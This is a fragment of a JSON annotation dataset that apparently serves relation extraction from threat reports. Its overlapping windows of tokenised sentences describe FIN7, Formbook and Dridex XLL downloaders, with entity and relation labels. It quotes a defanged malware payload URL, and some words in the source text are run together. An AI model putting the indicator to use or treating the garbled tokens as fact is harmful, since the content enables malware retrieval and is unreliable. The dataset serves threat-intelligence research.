[11, 12], "index": "15_0"}]], "labels": [{"r": "WR", "evidence": [0, 1], "t": 0, "h": 1}, {"r": "WR", "evidence": [0, 1], "t": 0, "h": 1}, {"r": "ST", "evidence": [1, 2, 3, 4, 5], "h": 1, "t": 8}, {"r": "RF", "evidence": [1, 2, 3, 4, 5], "h": 1, "t": 8}, {"r": "ST", "evidence": [1, 2, 3, 4, 5], "h": 1, "t": 8}, {"r": "RF", "evidence": [1, 2, 3, 4, 5], "h": 1, "t": 8}, {"r": "CO", "evidence": [1, 2], "h": 2, "t": 5}, {"r": "CO", "evidence": [1, 2], "h": 2, "t": 3}, {"r": "CO", "evidence": [1, 2], "h": 2, "t": 4}, {"r": "CO", "evidence": [1, 2, 3], "h": 2, "t": 6}, {"r": "CO", "evidence": [1, 2, 3, 4], "h": 2, "t": 7}, {"r": "CO", "evidence": [5], "h": 9, "t": 10}, {"r": "CO", "evidence": [6], "h": 11, "t": 12}, {"r": "CO", "evidence": [6, 7], "h": 11, "t": 14}, {"r": "ST", "evidence": [5, 6, 7], "t": 8, "h": 13}, {"r": "RF", "evidence": [5, 6, 7], "t": 8, "h": 13}, {"r": "FR", "evidence": [7], "h": 13, "t": 15}, {"r": "EX", "evidence": [7], "t": 14, "h": 15}]}, {"title": "607-40", "sents": [["Earlier", "this", "year", ",", "FIN7", "started", "using", "XLLs", "sent", "as", "attachments", "in", "malicious", "email", "campaigns", "."], ["For", "example", ",", "the", "XLL", "file", "from", "a", "February", "campaign", "was", "HASH", "``", "Quickbooks", "-", "40127.", "xll", "''", "."], ["The", "file", "serves", "as", "a", "downloader", "for", "the", "next", "stage", "."], ["The", "FIN7", "XLL", "downloaders", "are", "interesting", "as", "they", "appear", "to", "have", "been", "created", "with", "the", "Excel-DNA", "."], ["Modified", "FIN7", "Excel-DNA", "shim", "downloader", "connects", "to", "an", "attacker", "controlled", "hostCommodity", "malware", "familiesDridex", "downloaderDridex", "downloaders", ",", "such", "as", "HASH", ",", "are", "responsible", "for", "the", "major", "peak", "in", "the", "number", "of", "XLL", "files", "submitted", "to", "VirusTotal", "in", "late", "2021", "."], ["The", "XLL", "Formbook", "downloader", ",", "HASH", ",", "arrives", "in", "an", "email", "masquerading", "as", "an", "invoice", "sent", "from", "a", "company", "to", "the", "user", "."], ["When", "the", "user", "opens", "the", "attached", "XLL", "file", ",", "the", "malicious", "downloader", "is", "launched", "."], ["The", "downloader", "is", "rather", "simple", "and", "it", "enumerates", "the", "resource", "section", "of", "the", "file", "in", "a", "search", "for", "a", "specific", "string", "resource", "which", "contains", "the", "URL", "of", "the", "FormBook", "payload", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [4, 4], "name": "FIN7", "pos": [4, 5], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [7, 7], "name": "XLLs", "pos": [7, 8], "index": "1_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [20, 20], "name": "XLL file", "pos": [4, 6], "index": "2_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [27, 27], "name": "HASH", "pos": [11, 12], "index": "3_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [29, 29], "name": "Quickbooks - 40127. xll", "pos": [13, 17], "index": "4_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [36, 36], "name": "file", "pos": [1, 2], "index": "5_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [47, 47], "name": "FIN7 XLL downloaders", "pos": [1, 4], "index": "6_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [73, 73], "name": "hostCommodity", "pos": [10, 11], "index": "7_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [75, 75], "name": "familiesDridex downloaderDridex downloaders", "pos": [12, 15], "index": "8_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [81, 81], "name": "HASH", "pos": [18, 19], "index": "9_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [103, 103], "name": "XLL Formbook downloader", "pos": [1, 4], "index": "10_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [107, 107], "name": "HASH", "pos": [5, 6], "index": "11_0"}], [{"type": "TP", "sent_id": 6, "global_pos": [127, 127], "name": "user", "pos": [2, 3], "index": "12_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [131, 131], "name": "XLL file", "pos": [6, 8], "index": "13_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [136, 136], "name": "downloader", "pos": [11, 12], "index": "14_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [141, 141], "name": "downloader", "pos": [1, 2], "index": "15_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [146, 146], "name": "it", "pos": [6, 7], "index": "16_0"}], [{"type": "SF", "sent_id": 7, "global_pos": [161, 161], "name": "resource", "pos": [21, 22], "index": "17_0"}]], "labels": [{"r": "ST", "evidence": [0, 1, 2, 3, 4], "h": 0, "t": 7}, {"r": "RF", "evidence": [0, 1, 2, 3, 4], "h": 0, "t": 7}, {"r": "ST", "evidence": [0, 1, 2, 3, 4], "h": 0, "t": 7}, {"r": "RF", "evidence": [0, 1, 2, 3, 4], "h": 0, "t": 7}, {"r": "CO", "evidence": [0, 1], "h": 1, "t": 4}, {"r": "CO", "evidence": [0, 1], "h": 1, "t": 2}, {"r": "CO", "evidence": [0, 1], "h": 1, "t": 3}, {"r": "CO", "evidence": [0, 1, 2], "h": 1, "t": 5}, {"r": "CO", "evidence": [0, 1, 2, 3], "h": 1, "t": 6}, {"r": "CO", "evidence": [4], "h": 8, "t": 9}, {"r": "CO", "evidence": [5], "h": 10, "t": 11}, {"r": "CO", "evidence": [5, 6], "h": 10, "t": 13}, {"r": "ST", "evidence": [4, 5, 6], "t": 7, "h": 12}, {"r": "RF", "evidence": [4, 5, 6], "t": 7, "h": 12}, {"r": "FR", "evidence": [6], "h": 12, "t": 14}, {"r": "EX", "evidence": [6], "t": 13, "h": 14}, {"r": "CO", "evidence": [6, 7], "h": 14, "t": 16}, {"r": "CO", "evidence": [6, 7], "h": 14, "t": 15}, {"r": "RD", "evidence": [7], "h": 16, "t": 17}]}, {"title": "607-41", "sents": [["For", "example", ",", "the", "XLL", "file", "from", "a", "February", "campaign", "was", "HASH", "``", "Quickbooks", "-", "40127.", "xll", "''", "."], ["The", "file", "serves", "as", "a", "downloader", "for", "the", "next", "stage", "."], ["The", "FIN7", "XLL", "downloaders", "are", "interesting", "as", "they", "appear", "to", "have", "been", "created", "with", "the", "Excel-DNA", "."], ["Modified", "FIN7", "Excel-DNA", "shim", "downloader", "connects", "to", "an", "attacker", "controlled", "hostCommodity", "malware", "familiesDridex", "downloaderDridex", "downloaders", ",", "such", "as", "HASH", ",", "are", "responsible", "for", "the", "major", "peak", "in", "the", "number", "of", "XLL", "files", "submitted", "to", "VirusTotal", "in", "late", "2021", "."], ["The", "XLL", "Formbook", "downloader", ",", "HASH", ",", "arrives", "in", "an", "email", "masquerading", "as", "an", "invoice", "sent", "from", "a", "company", "to", "the", "user", "."], ["When", "the", "user", "opens", "the", "attached", "XLL", "file", ",", "the", "malicious", "downloader", "is", "launched", "."], ["The", "downloader", "is", "rather", "simple", "and", "it", "enumerates", "the", "resource", "section", "of", "the", "file", "in", "a", "search", "for", "a", "specific", "string", "resource", "which", "contains", "the", "URL", "of", "the", "FormBook", "payload", "."], ["FormBook", "finds", "the", "resource", "``", "f", "''", "which", "contains", "the", "payload", "URLOther", "notable", "commodity", "malware", "families", "that", "use", "XLLs", "as", "the", "infection", "vector", "and", "are", "not", "specifically", "described", "in", "this", "post", "include", "AgentTesla", ",", "Ransomware", "Stop", ",", "Vidar", ",", "Buer", "Loader", ",", "Nanocore", ",", "IceID", ",", "Arkei", ",", "AsyncRat", ",", "BazarLoader", "and", "others", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [4, 4], "name": "XLL file", "pos": [4, 6], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [11, 11], "name": "HASH", "pos": [11, 12], "index": "1_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [13, 13], "name": "Quickbooks - 40127. xll", "pos": [13, 17], "index": "2_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [20, 20], "name": "file", "pos": [1, 2], "index": "3_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [31, 31], "name": "FIN7 XLL downloaders", "pos": [1, 4], "index": "4_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [57, 57], "name": "hostCommodity", "pos": [10, 11], "index": "5_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [59, 59], "name": "familiesDridex downloaderDridex downloaders", "pos": [12, 15], "index": "6_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [65, 65], "name": "HASH", "pos": [18, 19], "index": "7_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [87, 87], "name": "XLL Formbook downloader", "pos": [1, 4], "index": "8_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [91, 91], "name": "HASH", "pos": [5, 6], "index": "9_0"}], [{"type": "TP", "sent_id": 5, "global_pos": [111, 111], "name": "user", "pos": [2, 3], "index": "10_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [115, 115], "name": "XLL file", "pos": [6, 8], "index": "11_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [120, 120], "name": "downloader", "pos": [11, 12], "index": "12_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [125, 125], "name": "downloader", "pos": [1, 2], "index": "13_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [130, 130], "name": "it", "pos": [6, 7], "index": "14_0"}], [{"type": "SF", "sent_id": 6, "global_pos": [145, 145], "name": "resource", "pos": [21, 22], "index": "15_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [155, 155], "name": "FormBook", "pos": [0, 1], "index": "16_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [160, 160], "name": "f", "pos": [5, 6], "index": "17_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [187, 187], "name": "AgentTesla", "pos": [32, 33], "index": "18_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [189, 189], "name": "Ransomware Stop", "pos": [34, 36], "index": "19_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [192, 192], "name": "Vidar", "pos": [37, 38], "index": "20_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [194, 194], "name": "Buer Loader", "pos": [39, 41], "index": "21_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [197, 197], "name": "Nanocore", "pos": [42, 43], "index": "22_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [199, 199], "name": "IceID", "pos": [44, 45], "index": "23_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [201, 201], "name": "Arkei", "pos": [46, 47], "index": "24_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [203, 203], "name": "AsyncRat", "pos": [48, 49], "index": "25_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [205, 205], "name": "BazarLoader", "pos": [50, 51], "index": "26_0"}]], "labels": [{"r": "CO", "evidence": [3], "h": 6, "t": 7}, {"r": "CO", "evidence": [4], "h": 8, "t": 9}, {"r": "CO", "evidence": [4, 5], "h": 8, "t": 11}, {"r": "ST", "evidence": [3, 4, 5], "t": 5, "h": 10}, {"r": "RF", "evidence": [3, 4, 5], "t": 5, "h": 10}, {"r": "FR", "evidence": [5], "h": 10, "t": 12}, {"r": "EX", "evidence": [5], "t": 11, "h": 12}, {"r": "WR", "evidence": [5, 6, 7], "h": 12, "t": 18}, {"r": "WR", "evidence": [5, 6, 7], "h": 12, "t": 19}, {"r": "WR", "evidence": [5, 6, 7], "h": 12, "t": 20}, {"r": "WR", "evidence": [5, 6, 7], "h": 12, "t": 21}, {"r": "WR", "evidence": [5, 6, 7], "h": 12, "t": 22}, {"r": "WR", "evidence": [5, 6, 7], "h": 12, "t": 23}, {"r": "WR", "evidence": [5, 6, 7], "h": 12, "t": 24}, {"r": "WR", "evidence": [5, 6, 7], "h": 12, "t": 25}, {"r": "WR", "evidence": [5, 6, 7], "h": 12, "t": 26}, {"r": "CO", "evidence": [5, 6], "h": 12, "t": 14}, {"r": "CO", "evidence": [5, 6], "h": 12, "t": 13}, {"r": "CO", "evidence": [5, 6, 7], "h": 12, "t": 16}, {"r": "RD", "evidence": [6], "h": 14, "t": 15}, {"r": "RD", "evidence": [7], "h": 16, "t": 17}]}, {"title": "607-42", "sents": [["The", "file", "serves", "as", "a", "downloader", "for", "the", "next", "stage", "."], ["The", "FIN7", "XLL", "downloaders", "are", "interesting", "as", "they", "appear", "to", "have", "been", "created", "with", "the", "Excel-DNA", "."], ["Modified", "FIN7", "Excel-DNA", "shim", "downloader", "connects", "to", "an", "attacker", "controlled", "hostCommodity", "malware", "familiesDridex", "downloaderDridex", "downloaders", ",", "such", "as", "HASH", ",", "are", "responsible", "for", "the", "major", "peak", "in", "the", "number", "of", "XLL", "files", "submitted", "to", "VirusTotal", "in", "late", "2021", "."], ["The", "XLL", "Formbook", "downloader", ",", "HASH", ",", "arrives", "in", "an", "email", "masquerading", "as", "an", "invoice", "sent", "from", "a", "company", "to", "the", "user", "."], ["When", "the", "user", "opens", "the", "attached", "XLL", "file", ",", "the", "malicious", "downloader", "is", "launched", "."], ["The", "downloader", "is", "rather", "simple", "and", "it", "enumerates", "the", "resource", "section", "of", "the", "file", "in", "a", "search", "for", "a", "specific", "string", "resource", "which", "contains", "the", "URL", "of", "the", "FormBook", "payload", "."], ["FormBook", "finds", "the", "resource", "``", "f", "''", "which", "contains", "the", "payload", "URLOther", "notable", "commodity", "malware", "families", "that", "use", "XLLs", "as", "the", "infection", "vector", "and", "are", "not", "specifically", "described", "in", "this", "post", "include", "AgentTesla", ",", "Ransomware", "Stop", ",", "Vidar", ",", "Buer", "Loader", ",", "Nanocore", ",", "IceID", ",", "Arkei", ",", "AsyncRat", ",", "BazarLoader", "and", "others", "."], ["NET", "based", "XLL", "file", ",", "HASH", ",", "that", "downloads", "the", "payload", "from", "the", "URL", "hxxp", ":", "//172.245.120.8/pdfreader.exe", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [1, 1], "name": "file", "pos": [1, 2], "index": "0_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [12, 12], "name": "FIN7 XLL downloaders", "pos": [1, 4], "index": "1_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [38, 38], "name": "hostCommodity", "pos": [10, 11], "index": "2_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [40, 40], "name": "familiesDridex downloaderDridex downloaders", "pos": [12, 15], "index": "3_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [46, 46], "name": "HASH", "pos": [18, 19], "index": "4_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [68, 68], "name": "XLL Formbook downloader", "pos": [1, 4], "index": "5_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [72, 72], "name": "HASH", "pos": [5, 6], "index": "6_0"}], [{"type": "TP", "sent_id": 4, "global_pos": [92, 92], "name": "user", "pos": [2, 3], "index": "7_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [96, 96], "name": "XLL file", "pos": [6, 8], "index": "8_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [101, 101], "name": "downloader", "pos": [11, 12], "index": "9_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [106, 106], "name": "downloader", "pos": [1, 2], "index": "10_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [111, 111], "name": "it", "pos": [6, 7], "index": "11_0"}], [{"type": "SF", "sent_id": 5, "global_pos": [126, 126], "name": "resource", "pos": [21, 22], "index": "12_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [136, 136], "name": "FormBook", "pos": [0, 1], "index": "13_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [141, 141], "name": "f", "pos": [5, 6], "index": "14_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [168, 168], "name": "AgentTesla", "pos": [32, 33], "index": "15_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [170, 170], "name": "Ransomware Stop", "pos": [34, 36], "index": "16_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [173, 173], "name": "Vidar", "pos": [37, 38], "index": "17_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [175, 175], "name": "Buer Loader", "pos": [39, 41], "index": "18_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [178, 178], "name": "Nanocore", "pos": [42, 43], "index": "19_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [180, 180], "name": "IceID", "pos": [44, 45], "index": "20_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [182, 182], "name": "Arkei", "pos": [46, 47], "index": "21_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [184, 184], "name": "AsyncRat", "pos": [48, 49], "index": "22_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [186, 186], "name": "BazarLoader", "pos": [50, 51], "index": "23_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [190, 190], "name": "NET", "pos": [0, 1], "index": "24_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [192, 192], "name": "XLL file", "pos": [2, 4], "index": "25_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [195, 195], "name": "HASH", "pos": [5, 6], "index": "26_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [200, 200], "name": "payload", "pos": [10, 11], "index": "27_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [204, 204], "name": "hxxp : //172.245.120.8/pdfreader.exe", "pos": [14, 17], "index": "28_0"}]], "labels": [{"r": "CO", "evidence": [2], "h": 3, "t": 4}, {"r": "CO", "evidence": [3], "h": 5, "t": 6}, {"r": "CO", "evidence": [3, 4], "h": 5, "t": 8}, {"r": "ST", "evidence": [2, 3, 4], "t": 2, "h": 7}, {"r": "RF", "evidence": [2, 3, 4], "t": 2, "h": 7}, {"r": "FR", "evidence": [4], "h": 7, "t": 9}, {"r": "EX", "evidence": [4], "t": 8, "h": 9}, {"r": "WR", "evidence": [4, 5, 6], "h": 9, "t": 15}, {"r": "WR", "evidence": [4, 5, 6], "h": 9, "t": 16}, {"r": "WR", "evidence": [4, 5, 6], "h": 9, "t": 17}, {"r": "WR", "evidence": [4, 5, 6], "h": 9, "t": 18}, {"r": "WR", "evidence": [4, 5, 6], "h": 9, "t": 19}, {"r": "WR", "evidence": [4, 5, 6], "h": 9, "t": 20}, {"r": "WR", "evidence": [4, 5, 6], "h": 9, "t": 21}, {"r": "WR", "evidence": [4, 5, 6], "h": 9, "t": 22}, {"r": "WR", "evidence": [4, 5, 6], "h": 9, "t": 23}, {"r": "CO", "evidence": [4, 5], "h": 9, "t": 11}, {"r": "CO", "evidence": [4, 5], "h": 9, "t": 10}, {"r": "CO", "evidence": [4, 5, 6], "h": 9, "t": 13}, {"r": "RD", "evidence": [5], "h": 11, "t": 12}, {"r": "RD", "evidence": [6], "h": 13, "t": 14}, {"r": "WR", "evidence": [6, 7], "t": 15, "h": 24}, {"r": "WR", "evidence": [6, 7], "t": 16, "h": 24}, {"r": "WR", "evidence": [6, 7], "t": 17, "h": 24}, {"r": "WR", "evidence": [6, 7], "t": 18, "h": 24}, {"r": "WR", "evidence": [6, 7], "t": 19, "h": 24}, {"r": "WR", "evidence": [6, 7], "t": 20, "h": 24}, {"r": "WR", "evidence": [6, 7], "t": 21, "h": 24}, {"r": "WR", "evidence": [6, 7], "t": 22, "h": 24}, {"r": "WR", "evidence": [6, 7], "t": 23, "h": 24}, {"r": "EX", "evidence": [7], "h": 24, "t": 25}, {"r": "WR", "evidence": [7], "h": 24, "t": 27}, {"r": "ST", "evidence": [7], "h": 24, "t": 28}, {"r": "RF", "evidence": [7], "h": 24, "t": 28}, {"r": "CO", "evidence": [7], "h": 25, "t": 26}]}, {"title": "607-43", "sents": [["The", "FIN7", "XLL", "downloaders", "are", "interesting", "as", "they", "appear", "to", "have", "been", "created", "with", "the", "Excel-DNA", "."], ["Modified", "FIN7", "Excel-DNA", "shim", "downloader", "connects", "to", "an", "attacker", "controlled", "hostCommodity", "malware", "familiesDridex", "downloaderDridex", "downloaders", ",", "such", "as", "HASH", ",", "are", "responsible", "for", "the", "major", "peak", "in", "the", "number", "of", "XLL", "files", "submitted", "to", "VirusTotal", "in", "late", "2021", "."], ["The", "XLL", "Formbook", "downloader", ",", "HASH", ",", "arrives", "in", "an", "email", "masquerading", "as", "an", "invoice", "sent", "from", "a", "company", "to", "the", "user", "."], ["When", "the", "user", "opens", "the", "attached", "XLL", "file", ",", "the", "malicious", "downloader", "is", "launched", "."], ["The", "downloader", "is", "rather", "simple", "and", "it", "enumerates", "the", "resource", "section", "of", "the", "file", "in", "a", "search", "for", "a", "specific", "string", "resource", "which", "contains", "the", "URL", "of", "the", "FormBook", "payload", "."], ["FormBook", "finds", "the", "resource", "``", "f", "''", "which", "contains", "the", "payload", "URLOther", "notable", "commodity", "malware", "families", "that", "use", "XLLs", "as", "the", "infection", "vector", "and", "are", "not", "specifically", "described", "in", "this", "post", "include", "AgentTesla", ",", "Ransomware", "Stop", ",", "Vidar", ",", "Buer", "Loader", ",", "Nanocore", ",", "IceID", ",", "Arkei", ",", "AsyncRat", ",", "BazarLoader", "and", "others", "."], ["NET", "based", "XLL", "file", ",", "HASH", ",", "that", "downloads", "the", "payload", "from", "the", "URL", "hxxp", ":", "//172.245.120.8/pdfreader.exe", "."], ["At", "the", "time", "of", "analysis", ",", "the", "URL", "hosted", "the", "Warzone", "payload", "HASH", ",", "and", "later", "hosted", "samples", "of", "AgentTesla", "and", "Lokibot", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [1, 1], "name": "FIN7 XLL downloaders", "pos": [1, 4], "index": "0_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [27, 27], "name": "hostCommodity", "pos": [10, 11], "index": "1_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [29, 29], "name": "familiesDridex downloaderDridex downloaders", "pos": [12, 15], "index": "2_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [35, 35], "name": "HASH", "pos": [18, 19], "index": "3_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [57, 57], "name": "XLL Formbook downloader", "pos": [1, 4], "index": "4_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [61, 61], "name": "HASH", "pos": [5, 6], "index": "5_0"}], [{"type": "TP", "sent_id": 3, "global_pos": [81, 81], "name": "user", "pos": [2, 3], "index": "6_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [85, 85], "name": "XLL file", "pos": [6, 8], "index": "7_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [90, 90], "name": "downloader", "pos": [11, 12], "index": "8_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [95, 95], "name": "downloader", "pos": [1, 2], "index": "9_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [100, 100], "name": "it", "pos": [6, 7], "index": "10_0"}], [{"type": "SF", "sent_id": 4, "global_pos": [115, 115], "name": "resource", "pos": [21, 22], "index": "11_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [125, 125], "name": "FormBook", "pos": [0, 1], "index": "12_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [130, 130], "name": "f", "pos": [5, 6], "index": "13_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [157, 157], "name": "AgentTesla", "pos": [32, 33], "index": "14_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [159, 159], "name": "Ransomware Stop", "pos": [34, 36], "index": "15_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [162, 162], "name": "Vidar", "pos": [37, 38], "index": "16_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [164, 164], "name": "Buer Loader", "pos": [39, 41], "index": "17_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [167, 167], "name": "Nanocore", "pos": [42, 43], "index": "18_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [169, 169], "name": "IceID", "pos": [44, 45], "index": "19_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [171, 171], "name": "Arkei", "pos": [46, 47], "index": "20_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [173, 173], "name": "AsyncRat", "pos": [48, 49], "index": "21_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [175, 175], "name": "BazarLoader", "pos": [50, 51], "index": "22_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [179, 179], "name": "NET", "pos": [0, 1], "index": "23_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [181, 181], "name": "XLL file", "pos": [2, 4], "index": "24_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [184, 184], "name": "HASH", "pos": [5, 6], "index": "25_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [189, 189], "name": "payload", "pos": [10, 11], "index": "26_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [193, 193], "name": "hxxp : //172.245.120.8/pdfreader.exe", "pos": [14, 17], "index": "27_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [207, 207], "name": "Warzone", "pos": [10, 11], "index": "28_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [209, 209], "name": "HASH", "pos": [12, 13], "index": "29_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [216, 216], "name": "AgentTesla", "pos": [19, 20], "index": "30_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [218, 218], "name": "Lokibot", "pos": [21, 22], "index": "31_0"}]], "labels": [{"r": "CO", "evidence": [1], "h": 2, "t": 3}, {"r": "CO", "evidence": [2], "h": 4, "t": 5}, {"r": "CO", "evidence": [2, 3], "h": 4, "t": 7}, {"r": "ST", "evidence": [1, 2, 3], "t": 1, "h": 6}, {"r": "RF", "evidence": [1, 2, 3], "t": 1, "h": 6}, {"r": "FR", "evidence": [3], "h": 6, "t": 8}, {"r": "EX", "evidence": [3], "t": 7, "h": 8}, {"r": "WR", "evidence": [3, 4, 5], "h": 8, "t": 14}, {"r": "WR", "evidence": [3, 4, 5], "h": 8, "t": 15}, {"r": "WR", "evidence": [3, 4, 5], "h": 8, "t": 16}, {"r": "WR", "evidence": [3, 4, 5], "h": 8, "t": 17}, {"r": "WR", "evidence": [3, 4, 5], "h": 8, "t": 18}, {"r": "WR", "evidence": [3, 4, 5], "h": 8, "t": 19}, {"r": "WR", "evidence": [3, 4, 5], "h": 8, "t": 20}, {"r": "WR", "evidence": [3, 4, 5], "h": 8, "t": 21}, {"r": "WR", "evidence": [3, 4, 5], "h": 8, "t": 22}, {"r": "CO", "evidence": [3, 4], "h": 8, "t": 10}, {"r": "CO", "evidence": [3, 4], "h": 8, "t": 9}, {"r": "CO", "evidence": [3, 4, 5], "h": 8, "t": 12}, {"r": "RD", "evidence": [4], "h": 10, "t": 11}, {"r": "RD", "evidence": [5], "h": 12, "t": 13}, {"r": "WR", "evidence": [5, 6], "t": 14, "h": 23}, {"r": "WR", "evidence": [5, 6], "t": 15, "h": 23}, {"r": "WR", "evidence": [5, 6], "t": 16, "h": 23}, {"r": "WR", "evidence": [5, 6], "t": 17, "h": 23}, {"r": "WR", "evidence": [5, 6], "t": 18, "h": 23}, {"r": "WR", "evidence": [5, 6], "t": 19, "h": 23}, {"r": "WR", "evidence": [5, 6], "t": 20, "h": 23}, {"r": "WR", "evidence": [5, 6], "t": 21, "h": 23}, {"r": "WR", "evidence": [5, 6], "t": 22, "h": 23}, {"r": "EX", "evidence": [6], "h": 23, "t": 24}, {"r": "WR", "evidence": [6], "h": 23, "t": 26}, {"r": "ST", "evidence": [6], "h": 23, "t": 27}, {"r": "RF", "evidence": [6], "h": 23, "t": 27}, {"r": "WR", "evidence": [6, 7], "h": 23, "t": 30}, {"r": "WR", "evidence": [6, 7], "h": 23, "t": 31}, {"r": "CO", "evidence": [6], "h": 24, "t": 25}, {"r": "CO", "evidence": [7], "h": 28, "t": 29}]}, {"title": "607-44", "sents": [["Modified", "FIN7", "Excel-DNA", "shim", "downloader", "connects", "to", "an", "attacker", "controlled", "hostCommodity", "malware", "familiesDridex", "downloaderDridex", "downloaders", ",", "such", "as", "HASH", ",", "are", "responsible", "for", "the", "major", "peak", "in", "the", "number", "of", "XLL", "files", "submitted", "to", "VirusTotal", "in", "late", "2021", "."], ["The", "XLL", "Formbook", "downloader", ",", "HASH", ",", "arrives", "in", "an", "email", "masquerading", "as", "an", "invoice", "sent", "from", "a", "company", "to", "the", "user", "."], ["When", "the", "user", "opens", "the", "attached", "XLL", "file", ",", "the", "malicious", "downloader", "is", "launched", "."], ["The", "downloader", "is", "rather", "simple", "and", "it", "enumerates", "the", "resource", "section", "of", "the", "file", "in", "a", "search", "for", "a", "specific", "string", "resource", "which", "contains", "the", "URL", "of", "the", "FormBook", "payload", "."], ["FormBook", "finds", "the", "resource", "``", "f", "''", "which", "contains", "the", "payload", "URLOther", "notable", "commodity", "malware", "families", "that", "use", "XLLs", "as", "the", "infection", "vector", "and", "are", "not", "specifically", "described", "in", "this", "post", "include", "AgentTesla", ",", "Ransomware", "Stop", ",", "Vidar", ",", "Buer", "Loader", ",", "Nanocore", ",", "IceID", ",", "Arkei", ",", "AsyncRat", ",", "BazarLoader", "and", "others", "."], ["NET", "based", "XLL", "file", ",", "HASH", ",", "that", "downloads", "the", "payload", "from", "the", "URL", "hxxp", ":", "//172.245.120.8/pdfreader.exe", "."], ["At", "the", "time", "of", "analysis", ",", "the", "URL", "hosted", "the", "Warzone", "payload", "HASH", ",", "and", "later", "hosted", "samples", "of", "AgentTesla", "and", "Lokibot", "."], ["Ducktail", "attempts", "to", "steal", "browser", "stored", "credentials", "and", "cookies", "with", "the", "specific", "intent", "to", "steal", "the", "details", "of", "Facebook", "friends", "and", "business", "contacts", "."]], "vertexSet": [[{"type": "SO", "sent_id": 0, "global_pos": [10, 